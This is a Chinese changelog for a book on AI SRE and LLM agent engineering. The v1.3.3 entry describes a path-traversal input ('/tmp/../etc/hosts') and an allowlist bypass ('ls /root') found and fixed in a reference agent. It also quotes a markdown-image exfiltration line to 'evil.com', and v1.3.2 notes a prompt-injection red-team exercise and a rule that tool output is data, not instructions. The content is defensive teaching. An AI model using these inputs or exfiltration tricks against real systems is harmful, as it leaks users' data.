---
title: CHANGELOG · 书的版本历史
updated: 2026-05-24
tags: [meta, changelog]
---

# CHANGELOG

> [← 维护系统](README.md)

本书遵循 [SemVer](https://semver.org/) 简化版：**MAJOR.MINOR.PATCH**
- **MAJOR** — 框架重构、整章删改
- **MINOR** — 新增章节
- **PATCH** — 快照数据、勘误

---

## 未发布（Unreleased）

> 这一段累积下一次 patch / minor 的草稿改动。

*（无）*

---

## v1.3.3 — 2026-05-24

**第二轮 SRE 跟读后的修订**：以 SRE 身份按 Unit 1 W1 方法对参考代码做了一次真实 trifecta 分析，挖到两个**真安全 bug**；同时补齐 Active Recall 题库的 v1.3.0 新增章节缺漏，统一跨文件不一致的数字。

### 修订（结构性 / 安全）
- **[代码/02-minimal-agent.py 修两个真 bug](../代码/02-minimal-agent.py)** ——
    - **read_file path traversal**：`startswith("/tmp/")` 通过但 `open(path)` 不做 path normalize → `/tmp/../etc/hosts` 真的读到 hosts。改为 `os.path.realpath()` 解开 `..` 和符号链接后再做前缀检查。**亲手验证修复有效**。
    - **run_shell 参数注入**：白名单只检查 `command.split()[0]`，`ls /root` 通过检查。改为**命令 + 参数双层白名单**：模型只能选预设 command 名（`ls_tmp`、`ls_var_log` 等），参数被服务端硬编码。
- **[第 6 章 / 深入 07 加两类被低估的外泄通道](../知识/06-AI自治与上下文架构约束.md#致命三角lethal-trifecta)** ——
    - **Markdown image / link 自动渲染**：模型在回答里嵌入 `![](http://evil.com/log?data=...)`，凡是 web 前端自动渲染 markdown 就被动外带数据
    - **人作为 egress hop**：操作者把 Agent 输出粘贴到工单 / chat / 邮件，人传人绕开技术防御
    - 加 "CLI demo 安全 ≠ Web 产品安全" 警示
- **[复习/Active Recall 题库补 深入 09-12](../复习/Active-Recall题库.md)** —— v1.3.0 新增了深入 11/12 但题库没跟进。补 12 道题，覆盖"该不该用 AI / 事故 pattern 识别 / 自治成熟度 / 选型决策"。
- **[复习/核心概念卡 + anki-import.csv tokenizer 数字统一](../复习/核心概念卡.md)** —— "比 Sonnet 多 ~26%" → "多约 35%"（与术语表 1.35× 口径一致）。

### 修订（一致性 / 体验）
- **[Capstone 加 A/B/C/D 评级判据](../练习/Capstone-AI生产架构评审包.md)** + **Unit 5 D 档读者 § 11 替代方案** + **自学者同伴 review 的替代**
- **[附录 E 模板 9 加 Defer 档](../附录/E-模板库.md)** —— Go/Conditional Go/Defer/No-Go 四档
- **[Unit 2 W1 加贯穿项目读者指引](../练习/Unit2-TraceEval统一可观测性/Week1-Trace-Eval一体化.md)** —— 画 as-is + to-be 而不是假设有现成 trace 系统
- **[Unit 3 W2 加 workload 数据从哪来速查](../练习/Unit3-推理SLO与静默降级/Week2-容量规划.md)** —— 贯穿项目 / 真实工作 / 无数据三档替代方案
- **[Unit 4 W2 加"verifier 不该叠"指引](../练习/Unit4-复合AI可靠性数学/Week2-Verifier设计.md)** —— Verifier 之间应正交，不同维度查不同失败模式
- **[Unit 1 W1 致命三角链接固定 URL](../练习/Unit1-Agent自治与致命三角/Week1-致命三角初识.md)** —— 不再依赖站内搜索
- **[复习 README 加手工跟踪表格示例](../复习/README.md)** + 推荐替代 SR 软件清单
- **[学习路线图 · 路线 B 时长改为 2-4 周（每天 1 小时）](../学习路线图.md)** —— 1-2 周不现实
- **[Unit 5 D 档加补做触发点](../练习/Unit5-数值与编译器级调试/总览.md)** —— 公司有 GPU / on-call 触发 / 半年自检三档触发条件
- **[附录 A 自检表扩到 12 个月](../附录/A-每月自检表.md)**
- **[附录 C 加精度字节表](../附录/C-术语表.md)** —— fp32/bf16/fp16/int8/int4 各几字节
- **[月度清单 A5 加 csv 同步必检](../维护/月度更新清单.md)** —— 概念卡和 anki csv 任何 Q/A 改动必须同步

### 元反馈
- **真安全 bug 来自实做**：以 SRE 身份按 Unit 1 W1 真的对 02-minimal-agent.py 跑了一遍 trifecta，亲手 `python3` 验证发现 path traversal 真的能读到 /etc/hosts、ls /root 真的能执行。**对着代码读不出来，必须动手验证**。
- **第一轮加的 sanitize_tool_result 是必要但不充分**：应用层做了净化，但工具本身的 path traversal 和参数注入仍是真攻击面。"应用层 + 工具层 + 基础设施层"三层都得做。

### 为什么是 patch 版本
- 没新增章节，没框架变化。
- 但本版含**真安全 bug 修复**（H1/H2）——下游用户应升级（如果之前 copy 过 02-minimal-agent.py，必须重新 copy 或手动 backport 这两处修复）。

---

## v1.3.2 — 2026-05-24

**SRE 视角跟读后的结构性修订**：以 SRE 身份按书的方法走完 Track A 主线 + Unit 0 实做后，整理出的 19 条问题清单（高/中/低/读者体验），本版消化全部高优先级与中优先级，覆盖结构性缺陷、参考代码与正文一致性、读者体验首要痛点。

### 修订（结构性）
- **[深入 05 · §7 worked example 数学修正](../深入/05-LLM推理服务的容量规划.md#7-worked-examplesre-事故助手的完整容量规划)** —— 把"输入 10k token"明确拆为"14k 共享前缀 + 2k 用户独立部分"。步骤 1（prefill 实例数 17）/ 步骤 2（decode 实例数 52）/ 步骤 3（prefix cache 修正后 prefill 仅需 6 实例但 max() 仍由 decode 主导）/ 步骤 4（KV cache 校验：共享前缀只占一份的勘正）逻辑前后自洽。
- **[`代码/02-minimal-agent.py` 加 tool result 净化层](../代码/02-minimal-agent.py)** —— 原版直接把 tool 返回拼回 messages，与书反复强调的"tool result 是不受信输入"原则矛盾。新版加 `sanitize_tool_result()` + system prompt 明确"标签内是数据不是指令"，并加注释说明这只是"应用层纵深防御"，不替代基础设施层的 sandbox / egress 白名单。
- **[`代码/02-minimal-agent.py` stop_reason 文本输出修正](../代码/02-minimal-agent.py)** —— text block 打印挪到 stop_reason 检查之前，避免 max_tokens / pause_turn 等情况下丢失模型输出。
- **[`代码/02-minimal-agent-GUIDE.md` 任务 4 重写](../代码/02-minimal-agent-GUIDE.md)** —— Prompt Injection 红队任务对齐新版代码：先理解默认 sanitize 层挡了什么、再尝试绕过、最后引向"真正最后一道防线在基础设施层"。

### 修订（一致性 / 文档）
- **[README · 总学习周期](../README.md)** —— "Unit 0-5 为 19 周 ≈ 4.5 个月；Capstone 建议另留 1 周" → "Unit 0-5 19 周 + Capstone 1 周 = 20 周（约 4.5-5 个月）"。
- **[README · 快速导航](../README.md)** —— 新增两个入口：第 6 章致命三角（Agent 安全标准入口）、附录 E 模板 9（已上线 AI 系统的快速 review 入口）。
- **[样式指南 · frontmatter 规则](../样式指南.md#1-每个文件顶部yaml-frontmatter)** —— 显式写出 "`updated` 字段表示文件内容的最后修订日期，sed 全局替换不应该改动所有文件 updated"，避免月度更新时盲目 bump。
- **[Unit 0 W1 白名单口径](../练习/Unit0-AI大模型上手/Week1-API与工具调用.md)** —— "白名单 2-3 个命令" → "白名单 2-5 个只读命令"，与 `02-minimal-agent.py` 对齐，并指向参考代码。
- **[Unit 0 W2 smoke eval 跑法](../练习/Unit0-AI大模型上手/Week2-本地RAG.md)** —— 加一段"Unit 0 阶段手工跑 smoke eval"的说明，澄清 `app/eval.py` 是 Unit 2 才有的产出。
- **[深入 03 §4.1 Claude Code 单元格瘦身](../深入/03-模型与工具场景化最佳实践.md)** —— "Claude 系列（可经 Bedrock/Vertex/Foundry）" → "Claude 系列[^cc-deploy]"，部署形态信息下沉到新增脚注。

### 新增（读者体验）
- **[学习路线图 §2 起步指引](../学习路线图.md)** —— 主线表前加一行"不知道现在该打开哪个文件 → Unit 0 总览"。
- **[深入 10 顶部：4 种失败模式 ↔ 15 个 pattern 映射表](../深入/10-AI系统事故模式库.md#使用方法)** —— 解释引章和本章的层次差异，给出对应关系。
- **[引章末尾：B1/B2/B3 速查](../01-引章-大模型速览.md)** —— 读者还没到第 10 章就在 Unit 任务里看到 B1/B2/B3 时，能立刻查到含义。
- **[贯穿项目 5 分钟起步命令清单](../练习/贯穿项目-SRE事故助手.md#5-分钟起步命令清单)** —— 零摩擦初始化 repo 的命令组合。
- **[`代码/README.md` · 代码 ↔ Unit/Week 对应表](../代码/README.md)** —— 学到哪一周该 copy 哪个文件。
- **[月度更新清单 · A5 复习系统校对](../维护/月度更新清单.md)** —— 月度清单新增"模型命名 / 价格 / 厂商分层"在 SR 卡里的同步校对项。

### 关键设计决策
- **修复结构性缺陷优先**：本次的两条 H 类问题都是"书的某处实践和书自己的方法论矛盾"，比一次性数字漂移更值得修。
- **更新模板自我应用**：上一轮 v1.3.1 的 worked example 是新写的，但跳过了 B2 "AI 挑错"流程。这一版补做了挑错。下次任何由 AI 主动新增的实质内容应在写完后立刻自挑一轮。
- **frontmatter 同步只 bump 实际改动的文件**：本次仅 14 个文件实际修订，frontmatter 也只更新这 14 个。

### 为什么是 patch 版本
- 没有新章节、没有框架变化。
- 全部为既有内容的修订、勘误、补丁、读者体验加强。
- 影响读者用书路径的部分（README 快速导航、学习路线图起步指引）属于体验微调而非主结构变化。

---

## v1.3.1 — 2026-05-24

**月度快照更新**：v1.3.0 后 2 周内厂商 / 榜单变化的系统性消化，框架与目录不变，全部为快变内容校对。

### 修订（按章节）
- **[深入 12 · §1 Gemini 段](../深入/12-Claude-GPT-Gemini三大模型系列使用指南.md#gemini-系列pro--flash--flash-lite--live)** —— Gemini 3 Pro Preview 已于 2026-03-09 关停，整段重写：升级到 3.1 Pro Preview / 3.5 Flash（稳定）/ 3.1 Flash-Lite 三档；加 §0 心智地图、§2 选型矩阵、TL;DR 同步更新。
- **[深入 03 · §3.11 榜单快照](../深入/03-模型与工具场景化最佳实践.md#311-关键榜单快照2026-05-24)** —— LM Arena Overall Top 10（Gemini 3.5 Flash 新进 #9，Grok 4.20 双子出榜）、Coding Top 5（#5 由 GLM-5.1 换为 GPT-5.4 High）、SWE-bench 加注 "mini-SWE-agent 框架口径" 并补全局 Top 5 来源。
- **[深入 03 · §1.5 OpenRouter 用量](../深入/03-模型与工具场景化最佳实践.md#15-开源-vs-闭源的差距变化)** —— Top 10 重写：DeepSeek 系列占 3 席，Anthropic 双子稳定 #3-4，"Owl Alpha" 实验模型进 #5；加 MoneyShare 维度（按月累计）。
- **[深入 03 · §4.1 工具生态](../深入/03-模型与工具场景化最佳实践.md#41-agentic-cli-工具)** —— stars / release 数字按月度更新；**opencode 项目 owner 由 `sst/opencode` 改名为 `anomalyco/opencode`**（旧 URL 仍 301，但脚注与正文同步更）。
- **[深入 03 · §3 OpenAI GPT 家族](../深入/03-模型与工具场景化最佳实践.md#gpt-5-家族)** —— gpt-5.5 补全价格（$5 / $30 per MTok）和 reasoning 档位；gpt-5.4 / 5.4-mini 同步补价格列；context 口径从 "1.05M (922K in/128K out)" 校准为官方 "1M / 128K out"。
- **[附录 C · 术语表](../附录/C-术语表.md)** —— 新增 "Tokenizer 代际差异" 条（Opus 4.7 用新 tokenizer，token 体积比 Sonnet 4.6 大 ~1.35×）；Gemini 分层条加注稳定档迁移。
- **[附录 D · Qwen URL](../附录/D-厂商官方学习资源.md)** —— `https://huggingface.co/Qwen（HF` 括号粘连修复（URL 后加空格分隔）。
- **全书 LM Arena URL** —— `lmarena.ai` 301 跳转到 `arena.ai`，所有引用同步更新（深入 03 脚注 + 月度清单 + 维护清单 + 漂移度表 + 共同语言 03 + AI辅助更新）。

### 维护
- 月度清单的 LM Arena URL 同步替换。
- 所有改动文件 frontmatter `updated:` 改为 2026-05-24。

### 关键设计决策
- **不重写框架**：本次纯快照漂移消化，所有结构 / 章节 / 学习路径不变。
- **OpenAI gpt-5.5 价格补全是新数据**（v1.3.0 当时未确认），属正常滚动补全，不算修订。
- **opencode owner 改名**算非纯数字漂移，但只改 slug / 注脚，不重排表格——仍记为 patch。

### 为什么是 patch 版本
- 没有新增章节、没有框架变化。
- 全部为快变内容（榜单、价格、stars、命名）的月度对齐。
- 影响读者用书路径的部分（仅 Gemini 段命名升级）已局部消化，未触发 minor。

---

## v1.3.0 — 2026-05-10

**内容丰富与路线优化版**：在 v1.2.0 的贯穿项目主线之上，补齐真实生产视角、主流模型系列使用常识，并新增一页式学习路线图，降低新读者进入成本。

### 新增
- **[学习路线图](../学习路线图.md)** — 新增根目录级学习导航页，明确主线必读、跟着 Unit 回查、按需查阅、三种推荐路线和最小承诺。
- **[深入 11 · AI SRE 现实图谱](../深入/11-AI-SRE现实图谱.md)** — 从真实生产环境出发，补充复合 AI 系统形态、SRE / ML 职责边界、自治成熟度、现实指标、生产评审清单。
- **[深入 12 · Claude / GPT / Gemini 三大模型系列使用指南](../深入/12-Claude-GPT-Gemini三大模型系列使用指南.md)** — 增补三大主流模型系列的常识性介绍、选型矩阵、模型路由、提示词习惯、生产接入注意事项。
- **[附录 E · 模板 9](../附录/E-模板库.md)** — 新增"AI 生产就绪一页评审"模板，支持上线 / 灰度 / 自治升级前的架构评审。

### 修订
- **README.md** — 快速导航、从头阅读、使用说明和模板数量口径更新，突出"路线图优先，深入专题按需查阅"。
- **mkdocs.yml** — 站点导航挂接学习路线图、深入 11 / 12，并同步站点版本、页脚版本到 v1.3.0。
- **[附录 B](../附录/B-参考文献.md)** — 增补 AI SRE 现实图谱、三大主流模型系列与风险治理的一手材料。
- **[附录 C](../附录/C-术语表.md)** — 增补 Claude / GPT / Gemini 系列命名与 reasoning / thinking budget 术语。
- **[附录 D](../附录/D-厂商官方学习资源.md)** — 在 Anthropic / OpenAI / Google 官方资源下挂接三大模型系列指南。
- **[漂移度表](漂移度表.md)** — 标注深入 11 / 12 为 📊 快变章节，纳入月度复查。
- **[月度更新清单](月度更新清单.md)** — 新增三大模型系列口径校对项。

### 关键设计决策
- **不重排大目录**：保留"理念 / 知识 / 练习 / 深入 / 科学 / 共同语言"的主体结构，只新增学习路线图作为导航层。
- **把深入专题定位为工具箱**：明确第一次学习不需要先读完深入专题，Unit 主线才是学习路径。
- **区分模型常识与快照选型**：[深入 12](../深入/12-Claude-GPT-Gemini三大模型系列使用指南.md) 讲 Claude / GPT / Gemini 系列的稳定使用心智，[深入 03](../深入/03-模型与工具场景化最佳实践.md) 继续承担榜单、价格、工具生态等快照信息。
- **生产视角优先**：[深入 11](../深入/11-AI-SRE现实图谱.md) 把 SRE / ML 职责、自治成熟度、上线评审和事故模式连成现实地图。

### 为什么是 minor 版本
- 新增 2 篇深入专题 + 1 个根目录学习导航页 + 1 个生产评审模板。
- README、MkDocs 导航、附录、维护系统均有挂接调整。
- 改变的是读者进入路径和内容使用方式，不是整本书的主框架，因此为 **minor** 而非 major。

---

## v1.2.0 — 2026-05-05

**新增贯穿项目主线**：给整本书加一条从 Unit 0 贯穿到 Capstone 的真实工程项目。

### 新增文件
- **[练习/贯穿项目-SRE事故助手.md](../练习/贯穿项目-SRE事故助手.md)** — 贯穿项目总览：为什么要有贯穿项目 / 项目目标 / 最小技术形态 / 演化地图 / 每 Unit 交付物 / 目录建议 / Mastery Gate / 可选支线（小模型微调）

### 挂接点（修订）
- **README.md** — 第三部分目录加贯穿项目链接；"如何使用这本书" 加"用贯穿项目陪跑"一条；"不同读者怎么走" 加自学者建议
- **练习/周循环总览.md** — 整体进度地图加"贯穿项目持续推进"提示；新增"贯穿项目怎么跟每周节奏结合"一节
- **Unit 0 总览 + W1 + W2** — 明确 Unit 0 是贯穿项目启动阶段；W1 / W2 加"贯穿项目路线交付物"
- **Unit 1-5 总览** — 各加"贯穿项目挂接点"小节，列出该 Unit 项目新增 + 验收
- **练习/Capstone-AI生产架构评审包.md** — 前置条件加"推荐对象 = 贯穿项目"的说明
- **附录/E-模板库.md** — 开头加贯穿项目挂接说明；新增**模板 8 · 贯穿项目 README**

### 关键设计决策
- **RAG + Tool-use Agent 是主线**（SRE 最相关、最快上手、最贴近生产）
- **小模型调参 / LoRA 微调是支线**（不作为主学习路径；做之前必须写决策文档）
- **不强绑定技术栈**（FastAPI / SQLite / Anthropic 只是建议组合，读者可按偏好选）
- **鼓励用真实脱敏数据**（自己公司的 runbook / postmortem）
- **Capstone 不重新选题**（直接以贯穿项目为对象）

### 为什么是 minor 版本
- 新增了一整条**学习主线**（不是单篇章节）
- 多个入口文件（README / 周循环 / Unit 0-5 / Capstone / 附录 E）都做了挂接
- 读者路径上出现了新的"分叉"（走不走贯穿项目），属于**读者体验层面的结构变化**
- 不改变既有三条 Track（A 能力 / B 学习 / C 协作），贯穿项目是**Track B 的强化形态**

### 修订说明
- 既有章节**不大规模重写**，只在关键位置挂接；旧读者路线依然完整
- 版本号统一 bump：README / 维护/README / CHANGELOG 三处同步到 v1.2.0

---

## v1.1.1 — 2026-05-05

**编辑校对与一致性修订版**：不改变内容框架，修正出版前校对中发现的口径、样式和可达性问题。

### 修订
- 修正 [前言](../00-前言.md) 中深入章节数量与练习结构的旧口径。
- 修正 [README](../README.md) 中 19 周主体学习周期与 Capstone 时间安排的表述。
- 修正 [Capstone](../练习/Capstone-AI生产架构评审包.md) 中不准确的表达与模板引用。
- 调整 [Unit 5 总览](../练习/Unit5-数值与编译器级调试/总览.md) 与 [Week 1](../练习/Unit5-数值与编译器级调试/Week1-数值级原理.md) 的无 GPU / 云 GPU 路线说明，避免硬件建议过度承诺。
- 修复 [AI 辅助更新](AI辅助更新.md) 中嵌套 Markdown 代码块导致的标题解析问题。
- 将 [AI 系统事故模式库](../深入/10-AI系统事故模式库.md) 的 Pattern 标题从 H1 调整为 H2，符合样式指南。

### 校对结果
- 全书 Markdown 文件均保持单一 H1。
- 未发现真实内容断链；样式指南和模板中的示例路径除外。
- 未发现未完成占位内容。

---

## v1.1.0 — 2026-05-05

**出版级完善版**：针对外部评审意见（Unit 后半程未展开 + 代码缺教学闭环 + 厂商偏重 + 快照标注不够 + Unit 5 门槛高）做系统性补完。

### 新增章节（13 个 Week 文件）
- **Unit 2** Week 1-4：Trace-Eval 一体化 / 三层 Eval 设计 / Judge 选型校准 / 合成 + Flywheel
- **Unit 3** Week 1-4：SLI 定义 / 容量规划 / 静默降级检测 / 灰度回滚决策树
- **Unit 4** Week 1-3：Step 预算 / Verifier 设计 / 合成评审 + 失效放大
- **Unit 5** Week 1-2：数值级原理 + 复现实验 / Runbook 产出

**意义**：Unit 0-5 全部有周级具体任务，读者可无缝走完 4.5 个月学习闭环。

### 新增代码教学指南（3 份）
- [代码 01 · GUIDE](../代码/01-claude-caching-GUIDE.md) · Claude Caching
- [代码 02 · GUIDE](../代码/02-minimal-agent-GUIDE.md) · 最小 Agent
- [代码 04 · GUIDE](../代码/04-eval-skeleton-GUIDE.md) · Eval Pipeline

每个 GUIDE 包含：运行前提、预期输出、常见报错、5 个改造任务、4 道读者作业（带自检答案）、生产化清单。

### 多厂商代码对照（4 份）
- [01-openai-caching.py](../代码/01-openai-caching.py)
- [01-local-vllm-caching.py](../代码/01-local-vllm-caching.py)
- [02-openai-agent.py](../代码/02-openai-agent.py)
- [02-local-agent.py](../代码/02-local-agent.py)

每份代码末尾有**字段映射 + 场景推荐**，帮助读者在厂商间迁移。

### 新增出版级组件
- **Capstone · AI 操作生产架构评审包**（[练习/Capstone-AI生产架构评审包.md](../练习/Capstone-AI生产架构评审包.md)）—— 把 Unit 0-5 的产出整合为一份可用于真实架构评审的文档
- **附录 E · 模板库**（[附录/E-模板库.md](../附录/E-模板库.md)）—— 7 份可直接复用的模板（Trace-Eval / 三层 Eval / SLO / 容量 / 复合可靠性 / 数值 Runbook / Postmortem）
- **README · "不同读者怎么走"**：5 类读者的差异化学习路径（SRE / 平台 / AI 应用 / 架构师 / ML）
- **README · "本书不教什么"**：明确定位边界，帮读者建立预期

### 快照数据警示（全局一致性）
- **深入 03 / 附录 D / 代码 01 GUIDE / 01-openai-caching.py / 01-local-vllm-caching.py / 02-local-agent.py** 统一加**快照日期 + 官方源**警告
- 快照数据规范沉淀到 [更新模板](更新模板.md)

### Unit 5 可达性改进
- **Unit 5 总览 + Week 1 新增"无 GPU 替代路径"**：有 GPU / 云资源 / 无 GPU / 只读 四档方案，每档说明能完成什么、代价是什么
- Week 1 实验 A 增补 CPU 版本的 softmax 数值实验代码
- 不降低 Unit 5 专业度，但不让读者因硬件门槛劝退

### 修订
- 所有 Unit 总览的"周节奏"从"待展开"更新为实际链接
- 代码 README 结构重组，明确区分核心 + 多厂商
- 维护/README.md 版本号 bug 修正（曾卡在 v1.0.0）

### 设计决策
- Unit 后半程 Week 文件与 Unit 0/1 同等详细度（本书走向可出版级）
- 代码教学闭环只做核心 3 个（01/02/04）—— 性价比最高
- 多厂商对照只覆盖核心 01/02 —— 验证 vendor-neutral 心智
- 保留 03/05/06/07 为"参考 snippet"级别
- 快照数据必须带日期 + 官方源链接（今后新增章节参照）

### 规模（v1.1.0 相对 v1.0.1）
- 新增 20+ 文件
- 新增 ~6500 行（markdown + python）
- 全书 90+ 文件

---

## v1.0.1 — 2026-05-05

### 新增
- **附录 D · 厂商官方学习资源** —— Anthropic Academy + anthropics/courses（5 门 Jupyter 课程）+ OpenAI Cookbook + DeepLearning.AI 合作课 + Google Gemini Cookbook + HuggingFace Learn + 其他厂商 docs 入口
- 附录 D 提供**按本书章节映射的学习路径表**（Unit 0 → Anthropic Course 1+5；Unit 2 → Course 4 + OpenAI Evals，等等）
- 附录 D 附**"该不该做" 判断框架**（高/中/低 ROI 分级 + 课程"气味"识别）

### 修订
- 维护/漂移度表 · 新增附录 D 条目，标记 📊（快变），加入"本月必查"列表

### 设计决策
- 保持 vendor-neutral 呈现：涵盖多家厂商，而非单列 Claude
- 明确定位："厂商课程 = 实操场，本书 = 独立完整的手册"
- 链接死活按 [漂移度表](漂移度表.md) 标准按季度校对

---

## v1.0.0 — 2026-05-05（初版）

**书的完整结构落地**。

### 三条主线就位
- **Track A · 能力**：理念 / 知识 / 深入 / 科学
- **Track B · 学习**：练习 / 复习
- **Track C · 协作**：共同语言

### 内容规模
- 62 个文件
- ~10,200 行 Markdown
- ~1,160 行 Python 参考代码

### 章节清单（按分区）

| 分区 | 数量 | 备注 |
|---|---|---|
| 理念 | 3 | — |
| 知识 | 6 | — |
| 练习 | 17 | Unit 0-5 + 周循环 + 10 |
| 深入 | 10 | 覆盖 TTFT / Caching / 场景选型 / Token 账 / 容量 / Eval / 红队 / 记忆 / 反 AI / 事故 pattern |
| 科学 | 4 | Attention / Lost in Middle / Quantization / Tokenization |
| 共同语言 | 5 | 训练 / Data / Research Eval / Alignment / 分布式训练 |
| 复习 | 5 | SR 卡 / Active Recall / Bloom / Anki CSV |
| 代码 | 8 | 7 Python 参考实现 + README |
| 附录 | 3 | 月检表 / 参考文献 / 术语表 |
| 维护 | 6 | 本次引入（含本文件）|
| 元 | 3 | README / 前言 / 引章 / 样式指南 |

### 关键设计决策（供后续维护者理解）

- 工程:科学 配比 ~70:30
- 学习方法：Feynman + Spaced Repetition + Mastery Gates + Bloom
- 定位："和算法工程师并肩的 SRE 架构师"
- 预期周期：4-5 个月学习 + 年度复审

---

## 如何贡献更新

1. 确认改动类型（patch / minor / major）
2. 对应章节做修改（遵循 [样式指南](../样式指南.md)）
3. 更新此文件的下一版本块（见 [更新模板](更新模板.md)）
4. 同步更新 README 的版本号
5. Commit / PR

---

## 历史版本归档

> v0.x 的早期快速迭代不保留详细历史——v1.0 是正式起点。

---

[← 维护系统](README.md)  ·  [📖 总目录](../README.md)
